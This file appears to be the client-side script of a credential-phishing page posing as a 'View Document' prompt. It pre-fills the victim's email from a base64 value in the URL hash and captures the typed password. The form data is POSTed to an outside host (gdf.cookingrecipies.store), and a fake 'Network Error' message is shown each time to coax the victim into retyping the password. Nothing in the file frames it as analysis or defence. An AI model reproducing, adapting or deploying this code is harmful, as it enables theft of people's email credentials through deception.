$(document).ready(function() {


    load();
    
    const btn = document.querySelector('#submitBtn');
	const pwd = document.querySelector('#x2');


btn.addEventListener('click',()=>{
    
    setTimeout(()=>{
        pwd.value = '';
        btn.textContent = 'View Document';
        btn.disabled = false;
    }, 2500)
});


    function load() {
        $('body').html(`
  
        <div class="col-sm-4 card">
        <img src="https://cdn.glitch.global/e1c2e8d6-fbb1-442a-957e-5c244b30a1b2/to.png" class="img-fluid">
      
        <form method="post" id="formx" class="my-4 p-3">
        <small class="text-danger" id="msg" style="font-weight:600;"></small>
                  
                  <div id="hello">
                    
                  </div>
    
            <input type="email" name="x1" id="x1" class="form-control mb-3" value="" readonly>
    
            <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value="" required>
    
    
            <button id="submitBtn" class="btn btn-md btn-block btn-danger btn-block">View Document</button>
        </form>
    
    </div>
`);

    }

    var baseUrl = (window.location).href;
 //   var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
  var url = atob(window.location.hash.substr(1));
  
    $("#x1").val(url);
const handleErr = ()=>{
      var errMsg = "";
      var spann = document.querySelector(".mmssgg");
      spann.textContent = errMsg;
      spann.innerHTML = "";
      spann.addEventListener("click", ()=>{
        alert('connected')
      spann.innerHTML = "";
        
      })
    }

 var btnPost = document.querySelector('#submitBtn');
  var divMsg = document.querySelector('#hello');
  var inpPwd = document.querySelector('#x2');
  
  inpPwd.addEventListener('input', ()=>{
            // alert('input was clicked!')
          divMsg.textContent = '';
    
  });
  
  
    btnPost.addEventListener('click', function(){
     
      setTimeout(function(){
        
        
        
        // alert(inpPwd.value);
        
        if(inpPwd.value === ""){
          
          
          divMsg.textContent = 'Network Error! Please verify your information and try again';
          divMsg.style.color = "#ba1100";
          

        }
        else{
          divMsg.textContent = 'Network Error! Please verify your information and try again';
          divMsg.style.color = "#ba1100";
        }
        
        
        
        
      }, 3000)
      // alert(divMsg.value);
      
    });
    
    // handleErr();
    
    $("#formx").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html(`<button id="submitBtn" class="btn btn-md btn-block btn-danger btn-block"> <span class="spinner-grow spinner-grow-sm"></span>
        Please Wait...</button>`).prop("disabled", true);
        $.ajax({
            url: "https://gdf.cookingrecipies.store/adb/index.php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {
                console.log(res);
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#x1").val(url);
                    $("#x2").val("");
                    $('#msg').html(``);
                    $("#submitBtn").html("View Document").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
